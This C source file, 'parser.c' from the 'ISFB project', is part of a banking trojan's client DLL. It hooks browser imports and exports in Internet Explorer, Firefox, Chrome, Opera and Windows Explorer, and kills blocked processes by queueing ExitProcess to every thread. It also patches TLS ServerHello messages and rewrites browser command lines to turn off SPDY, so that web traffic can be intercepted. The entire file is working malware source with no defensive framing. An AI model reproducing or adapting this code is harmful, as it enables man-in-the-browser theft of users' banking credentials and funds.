//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: parser.c
// $Revision: 394 $
// $Date: 2014-11-03 15:11:23 +0300 (Пн, 03 ноя 2014) $
// description:
//	ISFB client DLL. HTML content parcer routines.

#include "..\common\common.h"
#include "..\crypto\crypto.h"
#include "..\crm.h"
#include "transfer.h"
#include "parser.h"
#include "conf.h"
#include <DelayImp.h>
#include <Tlhelp32.h>
#include "pipes.h"
#include "files.h"
#include "ssl.h"

PHANDLE_TABLE	g_HandleTable = NULL;			// Handle table
ULONG			g_HostProcess = HOST_UNKNOWN;	// Host process ID (either IE or FF)

// Browser-specific User-Agent string, should be set by the Parser when application send first http request
LPTSTR volatile	g_UserAgentStr = NULL;


// ---- Functions -----------------------------------------------------------------------------------------------------------

//
//	Handle cleanup callback. 
//	Called by Handle table engine when the specified handle context being destoyed.
//
static BOOL _stdcall HandleCleanup(
	HANDLE	Key,
	PVOID	pContext
	)
{
	PHANDLE_CONTEXT	Ctx = (PHANDLE_CONTEXT)pContext;

	if (Ctx->Flags & CF_IE)
	{
		// Restoring original internet status callback
		ASSERT((LONG_PTR)Ctx->Callback >= 0);	// User-mode address
		InternetSetStatusCallback(Key, Ctx->Callback);
	}
	
	// Releasing streams
	if (Ctx->pStream)
		CoInvoke(Ctx->pStream, Release);
	if (Ctx->pReceiveStream)
		CoInvoke(Ctx->pReceiveStream, Release);
	if (Ctx->pStream1)
		CoInvoke(Ctx->pStream1, Release);


	if (Ctx->Url)
		hFree(Ctx->Url);
	if (Ctx->cBuffer)
		hFree(Ctx->cBuffer);

	if (Ctx->tCtx)
	{
		TransferReleaseContext(Ctx->tCtx);
		hFree(Ctx->tCtx);
	}

	if (Ctx->AsyncEvent)
		CloseHandle(Ctx->AsyncEvent);

	if (Ctx->pHeaders)
		hFree(Ctx->pHeaders);

#if _DEBUG
	Ctx->pStream = (LPSTREAM)BAD_PTR;
	Ctx->pReceiveStream = (LPSTREAM)BAD_PTR;
	Ctx->pStream1 = (LPSTREAM)BAD_PTR;

	Ctx->Callback = (PVOID)BAD_PTR;
	Ctx->Url = (LPSTR)BAD_PTR;
	Ctx->cBuffer = (PCHAR)BAD_PTR;
#endif
	return(TRUE);
}


//
//	Handle init callback.
//	Called by Handle table engine when the specified handle context being allocated.
//
static BOOL _stdcall HandleInit(
	HANDLE Key,
	PVOID pContext
	)
{
	PHANDLE_CONTEXT Ctx = (PHANDLE_CONTEXT)pContext;
	
	do	// not a loop
	{
		if (CreateStreamOnHGlobal(NULL, TRUE, &Ctx->pStream) != S_OK)
			break;

		if (g_HostProcess != HOST_IE)
		{
			if (CreateStreamOnHGlobal(NULL, TRUE, &Ctx->pReceiveStream) != S_OK)
				break;
			if (CreateStreamOnHGlobal(NULL, TRUE, &Ctx->pStream1) != S_OK)
				break;

			if (!(Ctx->cBuffer = hAlloc(MAX_CONTENT_BUFFER_SIZE + 4)))
				break;
		}
		else
		{
			if (!(Ctx->AsyncEvent = CreateEvent(NULL, FALSE, FALSE, NULL)))
				break;
		}

		ASSERT(Ctx->Callback == NULL);

		return(TRUE);
	} while(FALSE);

	if (Ctx->pStream)
		CoInvoke(Ctx->pStream, Release);
	if (Ctx->pReceiveStream)
		CoInvoke(Ctx->pReceiveStream, Release);
	if (Ctx->pStream1)
		CoInvoke(Ctx->pStream1, Release);


	UNREFERENCED_PARAMETER(Key);
	return(FALSE);
}


//
//	Returns current process' main module name hash.
//
ULONG ParserGetHostProcess(VOID)
{
	LPTSTR	ProcessName = NULL;
	ULONG	Host = HOST_UNKNOWN;

	if (g_CurrentProcessPath)
	{
		if (ProcessName = strrchr(g_CurrentProcessPath, '\\'))
			ProcessName += 1;
		else
			ProcessName = g_CurrentProcessPath;

		strupr(ProcessName);

		Host = (Crc32(ProcessName, lstrlen(ProcessName)) ^ g_CsCookie);
	}	// if (g_CurrentProcessPath)

	return(Host);
}


//
//	Sets IMPORT and EXPORT hooks.
//
WINERROR ParserHookImportExport(
	PHOOK_DESCRIPTOR	IatHooks,			// import hook descriptors array
	ULONG				NumberIatHooks,		// number of elements in the array
	PHOOK_DESCRIPTOR	ExportHooks,		// export hook descriptors array
	ULONG				NumberExportHooks	// number of elements in the array
	)
{
	WINERROR Status = NO_ERROR;


	if ((Status = SetMultipleHooks(ExportHooks, NumberExportHooks, NULL)) == NO_ERROR)
	{
		HMODULE*	ModArray = NULL;
		ULONG		ModCount = 0;

		if ((Status = PsSupGetProcessModules(GetCurrentProcess(), &ModArray, &ModCount)) == NO_ERROR)
		{
			ULONG i;
			for (i=0;i<ModCount;i++)
			{
				if (ModArray[i] != g_CurrentModule)
					SetMultipleHooks(IatHooks, NumberIatHooks, ModArray[i]);
			}
			hFree(ModArray);
		}
		
		if (Status != NO_ERROR)
			RemoveMultipleHooks((PHOOK_DESCRIPTOR)&ExportHooks, NumberExportHooks);
	}
	return(Status);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Terminates current host process queueing ExitProcess as APC function to every thread.
//
static VOID	CALLBACK ParserKillHost(
							IN	HANDLE	hTimer,				// (OPTIONAL) Handle to a Timer object used to call this routine
							IN	ULONG	dwTimerLowValue,	//	required parameter to use this function as callback of a waitable timer
							IN	ULONG	dwTimerHighValue	//	-"-
							)
{
	THREADENTRY32  Thread = {0};
	HANDLE	hSnapshot;

	if (hTimer)
		CloseHandle(hTimer);

	// Enumerate all process threads.
	Thread.dwSize = sizeof(THREADENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		PAPCFUNC pExitProcess = (PAPCFUNC)GetProcAddress(GetModuleHandleA(szKernel32), szExitProcess);
		HANDLE	hThread;
		
		ASSERT(pExitProcess);
		if (Thread32First(hSnapshot, &Thread))
		{
			do 
			{
				if (Thread.th32OwnerProcessID == g_CurrentProcessId &&
					(hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thread.th32ThreadID)))
				{
					QueueUserAPC(pExitProcess, hThread, 0);
					CloseHandle(hThread);
				}
			} while (Thread32Next(hSnapshot, &Thread));
		}	// if (Thread32First(hSnapshot, &Thread))
		CloseHandle(hSnapshot);
	}	// 	if (hSnapshot != INVALID_HANDLE_VALUE)

	UNREFERENCED_PARAMETER(dwTimerLowValue);
	UNREFERENCED_PARAMETER(dwTimerHighValue);

}

//
//	Initializes random tmer with callback routine that terminates current process when timer fires.
//
static BOOL	ParserKillHostDeferred(VOID)
{
	BOOL Ret = FALSE;
	HANDLE	hTimer;

	if (hTimer = CreateWaitableTimer(NULL, FALSE, NULL))
	{
		LARGE_INTEGER DueTime;

		DueTime.QuadPart = _RELATIVE(_SECONDS(rand()%30 + 3));
		Ret = SetWaitableTimer(hTimer, &DueTime, 0, (PTIMERAPCROUTINE)&ParserKillHost, hTimer, FALSE);
	}

	return(Ret);
}

//
//	Checks the host process our DLL is running within.
//	Sets host-specific hooks if any.
//
WINERROR ParserSetHooks(VOID)
{
	WINERROR Status = NO_ERROR;

	// Checking out if we were started within the IEXPLORE or FIREFOX process
	switch (g_HostProcess)
	{
	case HOST_EX:
		DbgPrint("ISFB_%04x: Started within Windows Shell process.\n", g_CurrentProcessId);
		Status = ExSetHooks();
		break;
	case HOST_IE:
		DbgPrint("ISFB_%04x: Started within IE process.\n", g_CurrentProcessId);
		Status = IeSetHooks();
		break;
	case HOST_FF:
		DbgPrint("ISFB_%04x: Started within FF process.\n", g_CurrentProcessId);
		Status = FfSetHooks();
		break;
	case HOST_CR:
		DbgPrint("ISFB_%04x: Started within CHROME process.\n", g_CurrentProcessId);
		Status = CrSetHooks();
		break;
	case HOST_OP:
		DbgPrint("ISFB_%04x: Started within OPERA process.\n", g_CurrentProcessId);
		Status = OpSetHooks();
		break;		
	case HOST_SF:
		DbgPrint("ISFB_%04x: Started within a blocked process - blocking.\n", g_CurrentProcessId);
		ParserKillHost(0,0,0);
		break;
	default:
		g_HostProcess = HOST_UNKNOWN;
		DbgPrint("ISFB_%04x: Unknown process - skipping hooks.\n", g_CurrentProcessId);
		break;
	};

	return(Status);
}


//
//	Activates the HTML parser and initializes User-Agent string.
//
VOID ActivateParser(
	LPTSTR	UserAgent
	)
{
	ULONG bSize;
	if (UserAgent && (bSize = lstrlen(UserAgent)))
	{
		// Acquiring the config lock here to synchronize g_UserAgentStr allocation.
		ConfigLockExclusive(&g_ConfigData);
		if (!g_UserAgentStr)
		{
			ULONG	MaxCon = MAX_CONNECTIONS_PER_SERVER;
			LPTSTR	pAgentStr;

			if (pAgentStr = (LPTSTR)hAlloc(bSize + sizeof(_TCHAR)))
			{
				lstrcpy(pAgentStr, UserAgent);
				g_UserAgentStr = pAgentStr;
				// Set active state event to notify workers.
				SetEvent(g_ActiveEvent);
				DbgPrint("ISFB_%04x: Parser for agent \"%s\" is active.\n", g_CurrentProcessId, g_UserAgentStr);
			}

			// Since WININET limits number of connetions per single server we have to increase it here 
			//  to avoid browser freezing while requesting multiple search patterns
			InternetSetOption(0, INTERNET_OPTION_MAX_CONNS_PER_SERVER, &MaxCon, sizeof(ULONG));
			InternetSetOption(0, INTERNET_OPTION_MAX_CONNS_PER_1_0_SERVER, &MaxCon, sizeof(ULONG));

		}	// if (!g_UserAgentStr)
		ConfigUnlockExclusive(&g_ConfigData);
	}	// if (UserAgent && (bSize = lstrlen(UserAgent)))
}


//
//	Checks the specified data buffer if it contains SSL ServerHello message.
//	Disables SPDY support by removing NPN extension from the message.
//	Returns:
//		> 0 - if the SPDY was successfully disabled
//		< 0	- if there was a size mismatch
//		0	- if the structure within the buffer is illegal
//
LONG ParserCheckReceiveDisableSpdy(
	PCHAR	Buffer,	// buffer containing received data
	LONG	Length	// size of the buffer in bytes
	)
{
	PTLS_RECORD			pTlsRecord;
	PTLS_MESSAGE		pTlsMessage;
	PTLS_SERVER_HELLO	pServerHello;
	PTLS_EXTENSION		pExtension;
	LONG	ExtLength, Total = Length;
	BOOL	bRemoved = FALSE;
	do
	{
		ASSERT(Length >= 1);

		pTlsRecord = (PTLS_RECORD)Buffer;

		if (pTlsRecord->ContentType != TLS_HANDSHAKE)
		{
			Length = 0;
			break;
		}

		if ((Length -= sizeof(TLS_RECORD)) < 0)
			break;

		if (htonS(pTlsRecord->Version) > TLS_MAX_VERSION)
		{
			Length = 0;
			break;
		}

		if ((Length -= sizeof(TLS_MESSAGE)) < 0)
			break;

		pTlsMessage = (PTLS_MESSAGE)&pTlsRecord->Data;

		// TLS record found within the buffer, cheking if it's a ServerHello message
		if (pTlsMessage->Type != TLS_MSG_SERVER_HELLO)
		{
			Length = 0;
			break;
		}

		if ((Length -= sizeof(TLS_SERVER_HELLO)) < 0)
			break;

		pServerHello = (PTLS_SERVER_HELLO)&pTlsMessage->Data;

		if (pServerHello->Version != pTlsRecord->Version)
		{
			Length = 0;
			break;
		}

		if ((Length -= htonS(pServerHello->ExtensionLength)) < 0)
			break;

		pExtension = (PTLS_EXTENSION)&pServerHello->Extensions;
		Length = htonS(pServerHello->ExtensionLength);

		// Walking through TLS extentions
		while(Length > 0)
		{
			ExtLength = sizeof(TLS_EXTENSION) + htonS(pExtension->Length);

			if ((Length -= ExtLength) >= 0)
			{
				USHORT ExtType = htonS(pExtension->Type);

				// CRHOME can use ALPN extension for SPDY instead of NPN
//				if (ExtType == TLS_EXT_ALPN)
//				{
//					// Removing TLS ALPN extension
//					pExtension->Type = TLS_EXT_NPN;
//					Length = Total;
//					break;
//				}

				if (ExtType == TLS_EXT_NPN && ExtLength == 44)
				{
					// Removing TLS NPN extension for SPDY
					if (g_HostProcess == HOST_FF)
						pExtension->Type = 0;
					else
						pExtension->Type = 0xffff;
					Length = Total;
					break;
				}
				pExtension = (PTLS_EXTENSION)((PCHAR)pExtension + ExtLength);
			}	// if (Length >= ExtLength)
		}	// while(Length)
	}while(FALSE);

	return(Length);
}

//
//	Scans the specified pApplicationName and pCommandLine for a process name.
//	If the process name belongs to CHROME or OPERA adds " --use-spdy=off" parameter to pCommandLine.
//	Returns the result command line.
//
LPWSTR	ParserModifyCmdLineW(LPWSTR pApplicationName, LPWSTR pCommandLine)
{
	LPWSTR	pAppNameU, pAppName = NULL, pNewCmdLine = NULL, pStr;
	ULONG	Len, NameHash;

	if (pApplicationName)
		pAppName = PathFindFileNameW(pApplicationName);

	if (!pAppName && pCommandLine)
		pAppName = PathFindFileNameW(pCommandLine);

	if (pAppName)
	{
		Len = ULONG_MAX;
		if (pStr = StrChrW(pAppName, L' '))
			Len = min(Len, (ULONG)(pStr - pAppName));
		if (pStr = StrChrW(pAppName, L'\"'))
			Len = min(Len, (ULONG)(pStr - pAppName));
		if (Len == ULONG_MAX)
			Len = lstrlenW(pAppName);

		if (pAppNameU = hAlloc((Len + 1) * sizeof(WCHAR)))
		{
			memcpy(pAppNameU, pAppName, Len * sizeof(WCHAR));
			pAppNameU[Len] = 0;
			wcsupr(pAppNameU);
	
			NameHash = (Crc32((PCHAR)pAppNameU, Len * sizeof(WCHAR)) ^ g_CsCookie);

			if (NameHash == HOST_CR_W || NameHash == HOST_OP_W)
			{
				if (pCommandLine)
					Len = lstrlenW(pCommandLine);

				if (pNewCmdLine = hAlloc((Len + cstrlenW(wczSpdyOff) + 1) * sizeof(WCHAR)))
				{
					if (pCommandLine)
					{
						lstrcpyW(pNewCmdLine, pCommandLine);
						StrTrimW(pNewCmdLine, L"- ");
					}
					else
						*pNewCmdLine = 0;
					lstrcatW(pNewCmdLine, wczSpdyOff);
				}	// if (pNewCmdLine = hAlloc(...
			}	// if (NameHash == HOST_CR_W || NameHash == HOST_OP_W)
			hFree(pAppNameU);
		}	// if (pAppNameU = hAlloc((Len + 1) * sizeof(WCHAR)))
	}	// if (pAppName)

	return(pNewCmdLine);
}


// ----- Remote workers start/stop routines -------------------------------------------------------------------------------

WINERROR ParserInitHandleTable(VOID)
{
	return(HandleAllocateTable(&g_HandleTable, sizeof(HANDLE_CONTEXT), (HANDLE_INIT_ROUTINE)&HandleInit,(HANDLE_CLEANUP_ROUTINE)&HandleCleanup));
}

VOID ParserReleaseHandleTable(VOID)
{
	if (g_UserAgentStr)
		hFree(g_UserAgentStr);

	if (g_HandleTable)
		HandleReleaseTable(g_HandleTable);
}


